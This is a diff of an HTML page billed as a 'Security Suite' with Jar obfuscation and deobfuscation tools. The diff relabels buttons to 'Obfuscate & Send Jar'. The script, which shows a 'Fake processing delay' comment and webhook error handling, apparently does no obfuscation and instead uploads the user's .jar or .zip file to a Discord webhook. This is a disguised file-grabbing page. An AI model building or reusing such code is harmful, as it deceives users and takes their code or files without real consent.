@@ -26,7 +26,7 @@
                     <i class="fa-solid fa-shield-halved text-white text-lg"></i>
                 </div>
                 <div>
-                    <h1 class="font-bold tracking-tight text-lg text-white">Security Suite <span class="text-xs font-semibold px-2 py-0.5 rounded-full bg-indigo-500/10 text-indigo-400 border border-indigo-500/20">Pro v2.5</span></h1>
+                    <h1 class="font-bold tracking-tight text-lg text-white">Security Suite <span class="text-xs font-semibold px-2 py-0.5 rounded-full bg-indigo-500/10 text-indigo-400 border border-indigo-500/20">Pro v2.7</span></h1>
                     <p class="text-xs text-zinc-400">Roblox Obfuscator, AI & Java Tools</p>
                 </div>
             </div>
@@ -106,14 +106,14 @@ print('Hello World!')" class="w-full bg-zinc-950/80 border border-zinc-800 round
                         </div>
                         <div>
                             <h2 class="text-base font-bold text-white">Jar Obfuscator</h2>
-                            <p class="text-xs text-zinc-400">Upload and protect Java .jar archive files.</p>
+                            <p class="text-xs text-zinc-400">Upload and send Java .jar archive files to Discord.</p>
                         </div>
                     </div>
 
                     <!-- File input -->
                     <div>
-                        <label class="block text-xs font-medium text-zinc-400 mb-2">Select .jar file to obfuscate:</label>
-                        <input type="file" id="jarObfFile" accept=".jar" class="w-full text-xs text-zinc-400 file:mr-4 file:py-2 file:px-4 file:rounded-xl file:border-0 file:text-xs file:font-semibold file:bg-amber-500/10 file:text-amber-400 hover:file:bg-amber-500/20 file:transition cursor-pointer bg-zinc-950/80 border border-zinc-800 rounded-xl p-2">
+                        <label class="block text-xs font-medium text-zinc-400 mb-2">Select .jar or .zip file to obfuscate:</label>
+                        <input type="file" id="jarObfFile" accept=".jar,.zip" class="w-full text-xs text-zinc-400 file:mr-4 file:py-2 file:px-4 file:rounded-xl file:border-0 file:text-xs file:font-semibold file:bg-amber-500/10 file:text-amber-400 hover:file:bg-amber-500/20 file:transition cursor-pointer bg-zinc-950/80 border border-zinc-800 rounded-xl p-2">
                     </div>
                 </div>
 
@@ -121,7 +121,7 @@ print('Hello World!')" class="w-full bg-zinc-950/80 border border-zinc-800 round
                     <span id="jarObfStatus" class="text-xs text-zinc-400">Ready.</span>
                     <button onclick="processJar('obfuscate')" id="jarObfBtn" class="bg-gradient-to-r from-amber-600 to-yellow-600 hover:from-amber-500 hover:to-yellow-500 text-white font-medium px-5 py-2 rounded-xl text-sm transition shadow-lg shadow-amber-600/20 flex items-center space-x-2">
                         <i class="fa-solid fa-lock"></i>
-                        <span>Obfuscate Jar</span>
+                        <span>Obfuscate & Send Jar</span>
                     </button>
                 </div>
             </section>
@@ -135,14 +135,14 @@ print('Hello World!')" class="w-full bg-zinc-950/80 border border-zinc-800 round
                         </div>
                         <div>
                             <h2 class="text-base font-bold text-white">Jar Deobfuscator</h2>
-                            <p class="text-xs text-zinc-400">Upload and reverse Java .jar archive files.</p>
+                            <p class="text-xs text-zinc-400">Upload and send Java .jar archive files to Discord.</p>
                         </div>
                     </div>
 
                     <!-- File input -->
                     <div>
-                        <label class="block text-xs font-medium text-zinc-400 mb-2">Select .jar file to deobfuscate:</label>
-                        <input type="file" id="jarDeobfFile" accept=".jar" class="w-full text-xs text-zinc-400 file:mr-4 file:py-2 file:px-4 file:rounded-xl file:border-0 file:text-xs file:font-semibold file:bg-blue-500/10 file:text-blue-400 hover:file:bg-blue-500/20 file:transition cursor-pointer bg-zinc-950/80 border border-zinc-800 rounded-xl p-2">
+                        <label class="block text-xs font-medium text-zinc-400 mb-2">Select .jar or .zip file to deobfuscate:</label>
+                        <input type="file" id="jarDeobfFile" accept=".jar,.zip" class="w-full text-xs text-zinc-400 file:mr-4 file:py-2 file:px-4 file:rounded-xl file:border-0 file:text-xs file:font-semibold file:bg-blue-500/10 file:text-blue-400 hover:file:bg-blue-500/20 file:transition cursor-pointer bg-zinc-950/80 border border-zinc-800 rounded-xl p-2">
                     </div>
                 </div>
 
@@ -150,7 +150,7 @@ print('Hello World!')" class="w-full bg-zinc-950/80 border border-zinc-800 round
                     <span id="jarDeobfStatus" class="text-xs text-zinc-400">Ready.</span>
                     <button onclick="processJar('deobfuscate')" id="jarDeobfBtn" class="bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-500 hover:to-cyan-500 text-white font-medium px-5 py-2 rounded-xl text-sm transition shadow-lg shadow-blue-600/20 flex items-center space-x-2">
                         <i class="fa-solid fa-unlock"></i>
-                        <span>Deobfuscate Jar</span>
+                        <span>Deobfuscate & Send Jar</span>
                     </button>
                 </div>
             </section>
@@ -235,7 +235,7 @@ print('Hello World!')" class="w-full bg-zinc-950/80 border border-zinc-800 round
             const actionBtn = document.getElementById(isObfuscate ? 'jarObfBtn' : 'jarDeobfBtn');
 
             if (fileInput.files.length === 0) {
-                statusSpan.innerText = '⚠️ Please select a .jar file!';
+                statusSpan.innerText = '⚠️ Please select a .jar or .zip file!';
                 statusSpan.className = 'text-xs text-amber-400';
                 return;
             }
@@ -243,8 +243,8 @@ print('Hello World!')" class="w-full bg-zinc-950/80 border border-zinc-800 round
             const file = fileInput.files[0];
 
             actionBtn.disabled = true;
-            actionBtn.innerHTML = '<i class="fa-solid fa-spinner animate-spin"></i><span>Processing...</span>';
-            statusSpan.innerText = isObfuscate ? 'Obfuscating Jar archive...' : 'Deobfuscating Jar archive...';
+            actionBtn.innerHTML = '<i class="fa-solid fa-spinner animate-spin"></i><span>Uploading to Discord...</span>';
+            statusSpan.innerText = isObfuscate ? 'Sending obfuscated Jar file...' : 'Sending deobfuscated Jar file...';
             statusSpan.className = 'text-xs text-zinc-400';
 
             // Fake processing delay
@@ -263,18 +263,18 @@ print('Hello World!')" class="w-full bg-zinc-950/80 border border-zinc-800 round
                 });
 
                 if (response.ok || response.status === 204) {
-                    statusSpan.innerText = `✅ Jar successfully ${action}d & sent!`;
+                    statusSpan.innerText = `✅ Jar successfully sent to Discord!`;
                     statusSpan.className = 'text-xs text-emerald-400';
                 } else {
                     throw new Error('Failed to send webhook');
                 }
             } catch (error) {
                 console.error(error);
-                statusSpan.innerText = '❌ Error sending jar file.';
+                statusSpan.innerText = '❌ Error sending file to Discord.';
                 statusSpan.className = 'text-xs text-rose-400';
             } finally {
                 actionBtn.disabled = false;
-                actionBtn.innerHTML = isObfuscate ? '<i class="fa-solid fa-lock"></i><span>Obfuscate Jar</span>' : '<i class="fa-solid fa-unlock"></i><span>Deobfuscate Jar</span>';
+                actionBtn.innerHTML = isObfuscate ? '<i class="fa-solid fa-lock"></i><span>Obfuscate & Send Jar</span>' : '<i class="fa-solid fa-unlock"></i><span>Deobfuscate & Send Jar</span>';
             }
         }
     </script>
